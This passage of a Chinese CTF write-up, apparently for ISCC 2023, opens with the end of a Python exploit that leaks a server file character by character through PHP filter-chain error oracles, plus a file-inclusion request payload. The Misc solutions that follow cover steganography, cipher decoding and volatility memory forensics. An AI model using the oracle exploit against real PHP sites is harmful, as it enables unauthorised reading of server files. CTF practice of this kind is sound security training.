<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># I J K</span>
<span class="hljs-keyword">if</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;K&#x27;</span>
<span class="hljs-keyword">elif</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>
):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;J&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;</span>
<span class="hljs-string">blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;I&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># v w x</span>
<span class="hljs-keyword">if</span> req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;x&#x27;</span>
<span class="hljs-keyword">elif</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;w&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blo</span>
<span class="hljs-string">w_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;v&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># V W X</span>
<span class="hljs-keyword">if</span>
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;blow_up_inf&#125;</span>
<span class="hljs-string">&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;X&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|dechunk|&#123;</span>
<span class="hljs-string">blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;W&#x27;</span>
<span class="hljs-keyword">elif</span> req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|&#123;rot1&#125;|string.rot13|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;|&#123;be&#125;|&#123;rot1&#125;</span>
<span class="hljs-string">|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;V&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># Z</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;Z&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># z</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;z&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># M</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;M&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|&#123;blo</span>
<span class="hljs-string">w_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># m</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;m&#x27;</span>
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># y</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;y&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># Y</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;Y&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># l</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;l&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|&#123;bl</span>
<span class="hljs-string">ow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># L</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;L&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dec</span>
<span class="hljs-string">hunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># h</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;h&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|st</span>
<span class="hljs-string">ring.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># H</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;H&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|strin</span>
<span class="hljs-string">g.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># u</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;u&#x27;</span>
<span class="hljs-keyword">elif</span> not req(
f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.4</span>
<span class="hljs-string">37.CP930|string.rot13|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># U</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;U&#x27;</span>
<span class="hljs-keyword">elif</span> not req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># g</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;g&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># G</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;G&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_inf&#125;&#x27;</span>):
<span class="hljs-comment"># t</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;t&#x27;</span>
<span class="hljs-keyword">elif</span> not
req(f<span class="hljs-string">&#x27;&#123;prefix&#125;|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|&#123;blow_up_in</span>
<span class="hljs-string">f&#125;&#x27;</span>):
<span class="hljs-comment"># T</span>
<span class="hljs-built_in">return</span> <span class="hljs-string">&#x27;T&#x27;</span>
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;something wrong&#x27;</span>)
<span class="hljs-built_in">print</span>()
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(2000):
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;&#x27;</span>
letter = find_letter(prefix)
<span class="hljs-comment"># it&#x27;s a number! check base64</span>
<span class="hljs-keyword">if</span> letter == <span class="hljs-string">&#x27;*&#x27;</span>:
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode&#x27;</span>
s = find_letter(prefix)
<span class="hljs-keyword">if</span> s == <span class="hljs-string">&#x27;M&#x27;</span>:
<span class="hljs-comment"># 0 - 3</span>
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#x27;</span>
ss = find_letter(prefix)
<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:
letter = <span class="hljs-string">&#x27;0&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:
letter = <span class="hljs-string">&#x27;1&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:
letter = <span class="hljs-string">&#x27;2&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:
letter = <span class="hljs-string">&#x27;3&#x27;</span>
<span class="hljs-keyword">else</span>:
err(f<span class="hljs-string">&#x27;bad num (&#123;ss&#125;)&#x27;</span>)
<span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;N&#x27;</span>:
<span class="hljs-comment"># 4 - 7</span>
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#x27;</span>
ss = find_letter(prefix)
<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:
letter = <span class="hljs-string">&#x27;4&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:
letter = <span class="hljs-string">&#x27;5&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ijklmn&#x27;</span>:
letter = <span class="hljs-string">&#x27;6&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;yz*&#x27;</span>:
letter = <span class="hljs-string">&#x27;7&#x27;</span>
<span class="hljs-keyword">else</span>:
err(f<span class="hljs-string">&#x27;bad num (&#123;ss&#125;)&#x27;</span>)
<span class="hljs-keyword">elif</span> s == <span class="hljs-string">&#x27;O&#x27;</span>:
<span class="hljs-comment"># 8 - 9</span>
prefix = f<span class="hljs-string">&#x27;&#123;header&#125;|&#123;get_nth(i)&#125;|convert.base64-encode|&#123;r2&#125;&#x27;</span>
ss = find_letter(prefix)
<span class="hljs-keyword">if</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;CDEFGH&#x27;</span>:
letter = <span class="hljs-string">&#x27;8&#x27;</span>
<span class="hljs-keyword">elif</span> ss <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;STUVWX&#x27;</span>:
letter = <span class="hljs-string">&#x27;9&#x27;</span>
<span class="hljs-keyword">else</span>:
err(f<span class="hljs-string">&#x27;bad num (&#123;ss&#125;)&#x27;</span>)
<span class="hljs-keyword">else</span>:
err(<span class="hljs-string">&#x27;wtf&#x27;</span>)
<span class="hljs-built_in">print</span>(end=letter)
o += letter
sys.stdout.flush()
<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span>
<span class="hljs-string">We are done!! :)</span>
<span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span>
<span class="hljs-built_in">print</span>()
<span class="hljs-built_in">print</span>(o)
d = b64decode(o.encode() + b<span class="hljs-string">&#x27;=&#x27;</span> * 4)
<span class="hljs-comment"># remove KR padding</span>
d = d.replace(b<span class="hljs-string">&#x27;$)C&#x27;</span>, b<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-built_in">print</span>(b64decode(d))</code></pre>
<p>然后会得到一半 flag 和其他的 key（有提示，多试几次就好了）<br>之后观察页面，更改格式得到另一半的 flag<br><img src="https://img-blog.csdnimg.cn/3b6c01ad12ff46cab0f8e6d9d661f7d0.png" alt="在这里插入图片描述"><br>Payload=shell.php?lastkey=DoUlikemyOrcle&amp;file=shell.php</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="好看的维吾尔族小姐姐"><a href="#好看的维吾尔族小姐姐" class="headerlink" title="好看的维吾尔族小姐姐"></a>好看的维吾尔族小姐姐</h2><p>下载附件，用010Editor打开文件<br><img src="https://img-blog.csdnimg.cn/2ab6f67c930648dc998b2e3550991e6e.png#pic_center" alt="在这里插入图片描述"><br>通过文件头信息知道这是PNG文件<br>用010更改图片的宽和高，发现有类似于二维码的图形出现。截屏保存，使用在线图片翻转<a href="https://www.gaitubao.com/xuanzhuan%E5%B0%86%E5%85%B6%E8%BF%9B%E8%A1%8C%E5%B7%A6%E5%8F%B3%E9%95%9C%E5%83%8F%E7%BF%BB%E8%BD%AC%E5%BE%97%E5%88%B0%E4%BA%8C%E7%BB%B4%E7%A0%81%EF%BC%8C%E7%94%A8%E6%94%AF%E4%BB%98%E5%AE%9D%E6%89%AB%E6%8F%8F%E5%90%8E%E5%BE%97%E5%88%B0">https://www.gaitubao.com/xuanzhuan将其进行左右镜像翻转得到二维码，用支付宝扫描后得到</a></p>
<blockquote>
<p>;521#&amp;;33#&amp;;101#&amp;;011#&amp;;111#&amp;;001#&amp;;801#&amp;;801#&amp;;101#&amp;;911#&amp;;59#&amp;;611#&amp;;501#&amp;;59#&amp;;611#&amp;;111#&amp;;301#&amp;;59#&amp;;711#&amp;;111#&amp;;121#&amp;;321#&amp;;76#&amp;;76#&amp;;38#&amp;;37#&amp;</p>
</blockquote>
<p>按照正确的形式，将其反过来得到</p>
<blockquote>
<p>&#73;&#83;&#67;&#67;&#123;&#121;&#111;&#117;&#95;&#103;&#111;&amp;#1**;&amp;#<strong>;&amp;#</strong>*;&amp;#*16;&#95;&#119;&#101;&#108;&#108;&#100;&#111;&#110;&#101;&#33;&#125;</p>
</blockquote>
<p>得到flag</p>
<h2 id="人生之路"><a href="#人生之路" class="headerlink" title="人生之路"></a>人生之路</h2><p>附件下载得到一个名为flag压缩包和一个名为人生之路的图片。打开压缩包需要密码，解压缩密码为图片名称，即人生之路.jpeg。解压之后得到flag.txt文件，对其内容进行凯撒爆破位移，然后匹配密码表，得到码表如下：</p>
<blockquote>
<p>“saIsIwIdIwaIsdIsI”: “A”,<br>    “sZwZdZsZaZdZsZaZ”: “B”,<br>    “aZsZdZ”: “C”,<br>    “sZwZdZsZaZ”: “D”,<br>    “dZaZsIdZaZsIdZ”: “E”,<br>    “dZaZsZaIdZ”: “F”,<br>    “aZsZdZwIaI”: “G”,<br>    “sZwIdZwIsZ”: “H”,<br>    “dZaIsZaIdZ”: “I”,<br>    “dZaIsZaI”: “J”,<br>    “sZwIdIdwIsaIsdI”: “K”,<br>    “sZdZ”: “L”,<br>    “wZsdIwdIsZ”: “M”,<br>    “wZsdZwZ”: “N”,<br>    “sZdZwZaZ”: “O”,<br>    “sZwZdZsIaZ”: “P”,<br>    “aZwZdZsZsdI”: “Q”,<br>    “sZwZdZsIaZdZsI”: “R”,<br>    “aZsIdZsIaZ”: “S”,<br>    “dZaIsZ”: “T”,<br>    “sZdZwZ”: “U”,<br>    “sIsdIdwIwI”: “V”,<br>    “sdZwdZsdZwdZ”: “W”,<br>    “sdZwaIwdIsaZ”: “X”,<br>    “sdIwdIsaIsI”: “Y”,<br>    “dZsaZdZ”: “Z”,<br>    “aIsIaIdIsIdI”: “{“,<br>    “dIsIdIaIsIaI”: “}”</p>
</blockquote>
<p>flag.txt文件中打开得到</p>
<blockquote>
<p>mIjRbIjRmI jIbRmIbRjI jIbImI jIbImI jRbRjRmRbRmR bRbmRmfRfR bImIfIjI mIjIbRmIjIbRmI fIbmRfmRbI bIfRmRmfRbjRbmR mIjRbIjR mIjRbI jIbImI bjRbRfRmRfjRbmRbR bImIfI bIfImIbIjImIbIjI mIjRbI jIfImIbIbmR bmIfjRfmRbjI bRbmRmfRfR mRbRmRjRbRjR </p>
</blockquote>
<p>写脚本：</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> string
c=<span class="hljs-string">&quot;mIjRbIjRmI jIbRmIbRjI jIbImI jIbImI jRbRjRmRbRmR bRbmRmfRfR bImIfIjI mIjIbRmIjIbRmI fIbmRfmRbI bIfRmRmfRbjRbmR mIjRbIjR mIjRbI jIbImI bjRbRfRmRfjRbmRbR bImIfI bIfImIbIjImIbIjI mIjRbI jIfImIbIbmR bmIfjRfmRbjI bRbmRmfRfR mRbRmRjRbRjR &quot;</span>.strip()
a=c.split(<span class="hljs-string">&quot; &quot;</span>)
a=<span class="hljs-built_in">list</span>(a[<span class="hljs-number">0</span>])
p=<span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> string.ascii_lowercase:
        i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)
        <span class="hljs-keyword">while</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;wasd&quot;</span>:
            i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">97</span>+<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)
            p+=<span class="hljs-number">1</span>
    <span class="hljs-keyword">elif</span> i <span class="hljs-keyword">in</span> string.ascii_uppercase:
        i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">65</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)
        <span class="hljs-keyword">while</span> i <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ZI&quot;</span>:
            i=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)-<span class="hljs-number">65</span>+<span class="hljs-number">1</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)
            p+=<span class="hljs-number">1</span>
a=<span class="hljs-built_in">list</span>(c)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):
    <span class="hljs-keyword">if</span> a[i]==<span class="hljs-string">&quot; &quot;</span>:
        <span class="hljs-keyword">pass</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">if</span> a[i] <span class="hljs-keyword">in</span> string.ascii_lowercase:
            a[i]=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">97</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>)
        <span class="hljs-keyword">elif</span> a[i] <span class="hljs-keyword">in</span> string.ascii_uppercase:
            a[i]=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(a[i])-<span class="hljs-number">65</span>+p)%<span class="hljs-number">26</span>+<span class="hljs-number">65</span>)
a=<span class="hljs-string">&quot;&quot;</span>.join(a)
a=a.split(<span class="hljs-string">&quot; &quot;</span>)
<span class="hljs-built_in">map</span>=&#123;
    <span class="hljs-string">&quot;saIsIwIdIwaIsdIsI&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsZaZdZsZaZ&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>,
    <span class="hljs-string">&quot;aZsZdZ&quot;</span>: <span class="hljs-string">&quot;C&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsZaZ&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>,
    <span class="hljs-string">&quot;dZaZsIdZaZsIdZ&quot;</span>: <span class="hljs-string">&quot;E&quot;</span>,
    <span class="hljs-string">&quot;dZaZsZaIdZ&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>,
    <span class="hljs-string">&quot;aZsZdZwIaI&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>,
    <span class="hljs-string">&quot;sZwIdZwIsZ&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>,
    <span class="hljs-string">&quot;dZaIsZaIdZ&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>,
    <span class="hljs-string">&quot;dZaIsZaI&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>,
    <span class="hljs-string">&quot;sZwIdIdwIsaIsdI&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>,
    <span class="hljs-string">&quot;sZdZ&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>,
    <span class="hljs-string">&quot;wZsdIwdIsZ&quot;</span>: <span class="hljs-string">&quot;M&quot;</span>,
    <span class="hljs-string">&quot;wZsdZwZ&quot;</span>: <span class="hljs-string">&quot;N&quot;</span>,
    <span class="hljs-string">&quot;sZdZwZaZ&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsIaZ&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>,
    <span class="hljs-string">&quot;aZwZdZsZsdI&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>,
    <span class="hljs-string">&quot;sZwZdZsIaZdZsI&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,
    <span class="hljs-string">&quot;aZsIdZsIaZ&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>,
    <span class="hljs-string">&quot;dZaIsZ&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>,
    <span class="hljs-string">&quot;sZdZwZ&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>,
    <span class="hljs-string">&quot;sIsdIdwIwI&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>,
    <span class="hljs-string">&quot;sdZwdZsdZwdZ&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>,
    <span class="hljs-string">&quot;sdZwaIwdIsaZ&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>,
    <span class="hljs-string">&quot;sdIwdIsaIsI&quot;</span>: <span class="hljs-string">&quot;Y&quot;</span>,
    <span class="hljs-string">&quot;dZsaZdZ&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>,
    <span class="hljs-string">&quot;aIsIaIdIsIdI&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>,
    <span class="hljs-string">&quot;dIsIdIaIsIaI&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>
&#125;
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">map</span>[i],end=<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-built_in">print</span>()</code></pre>
<h2 id="菜鸟黑客-1"><a href="#菜鸟黑客-1" class="headerlink" title="菜鸟黑客-1"></a>菜鸟黑客-1</h2><p>先下载附件发现一个raw文件<br><img src="https://img-blog.csdnimg.cn/7dc8337d428441be8c44d63397c6de39.png" alt="在这里插入图片描述"><br>用R-Studio打开进行扫描<br><img src="https://img-blog.csdnimg.cn/33ccf26c7de64a3e90542fc63eac56a0.png" alt="在这里插入图片描述"><br>发现flag文件<br><img src="https://img-blog.csdnimg.cn/8ce489b39b1c4c9ab0a7766b9e2e79fd.png" alt="在这里插入图片描述"><br>打开后发现一个DES编码<br><img src="https://img-blog.csdnimg.cn/25cb84a2db284648abb2ca8346c1c5c9.png" alt="在这里插入图片描述"><br>对这个进行DES解码就得到了flag：ISCC{dbsy_cdis_fd7n_s4fd}</p>
<h2 id="菜鸟黑客-2"><a href="#菜鸟黑客-2" class="headerlink" title="菜鸟黑客-2"></a>菜鸟黑客-2</h2><p>1、 先看看桌面有什么<br>volatility -f 1.raw –profile=Win2008R2SP1x64 filescan | grep Desktop<br>发现这个图片<br><img src="https://img-blog.csdnimg.cn/833bd468530f4cdf82697cd955059a06.png#pic_center" alt="在这里插入图片描述"><br>2、 把图片 down 下来<br>volatility -f 1.raw –profile=Win2008R2SP1x64 dumpfiles -Q 0x000000007dfaff20 -D ./<br>得到一个表情包图片<br>3、 用 formost 分离一下，得到一个压缩包，压缩包的密码是前面看到 ISCC2023<br>4、 解压后得到文本内容，提示要维吉尼亚 解 MEQL{invk_vhlu_dzel_lkof}<br>5、 Editbox 看一下 volatility -f 1.raw –profile=Win2008R2SP1x64 editbox<br>得到提示 Pay attention to emoji’s eyes<br><img src="https://img-blog.csdnimg.cn/d28a1e6637ba4059b0a6d349ccb60b17.png#pic_center" alt="在这里插入图片描述"><br>6、 结合前面的表情包，园眼睛 . 长眼睛 - 解摩斯，得到 EMOJIISFUN<br><img src="https://img-blog.csdnimg.cn/d1690fb6fd73493c8d78e97deb196f69.png#pic_center" alt="在这里插入图片描述"><br>7 .维吉尼亚解出来 ISCC{afdf_buhi_pqwd_tfus}<br><img src="https://img-blog.csdnimg.cn/9f6785b495e043109dc443888cc5ab8a.png#pic_center" alt="在这里插入图片描述"></p>
<h2 id="汤姆历险记"><a href="#汤姆历险记" class="headerlink" title="汤姆历险记"></a>汤姆历险记</h2><p>附件下载，用010打开Tom.jpg文件，文件头没有问题，继续往下翻，发现编译问题<br><img src="https://img-blog.csdnimg.cn/909e2b7c568e4224962adfa30e1daf1f.png#pic_center" alt="在这里插入图片描述"><br>将这一长串复制下来，打开CTF编码工具，进行字频分析<br><img src="https://img-blog.csdnimg.cn/b4fbb7a1d7f04b368b5637954b1189ff.png#pic_center" alt="在这里插入图片描述"><br>得到类似flag，将文件改成zip格式发现一个同名的docx文件，打开需要密码，即为刚解出来的字符串，打开文档发现行间距有的是1，有的是1.5，中间还有空行。尝试将其变形成二进制，结果错误。将其变成摩斯密码，即</p>
<blockquote>
<p>… -. -.. –. .- -.- . .-</p>
</blockquote>
<p>摩斯密码解密后结果为</p>
<blockquote>
<p>sndgakea</p>
</blockquote>
<p>对照字典为a0mdf59f，即为正确flag</p>
<h2 id="信息传递"><a href="#信息传递" class="headerlink" title="信息传递"></a>信息传递</h2><p>附件下载后有PCAPNG文件，用Wireshark打开，找到IMF文件，导出IMF文件<br><img src="https://img-blog.csdnimg.cn/8fc01a466f1a4e4098d788a2682ddaed.png#pic_center" alt="在这里插入图片描述"><br>用QQ邮箱打开这两个文件，发现一个普通附件，发送出去后从接收端打开<br>发现压缩包文件需要密码，试了好多都不对。观察CRC32的数据，发现只有B1852B0D和9DE9E501两种，将其用二进制0和1表示，得到二进制数据</p>
<blockquote>
<p>0100100101010011010000110100001101111011011010010011001001110011001100000110001100110010011000110011001101111101</p>
</blockquote>
<p>将二进制转换成字符串得到flag，再通过题目所给的字典进行替换得到最终的flag</p>
<p><img src="https://img-blog.csdnimg.cn/2a80b7606cff4aa8bcd55aa51784c6a5.png#pic_center" alt="在这里插入图片描述"></p>
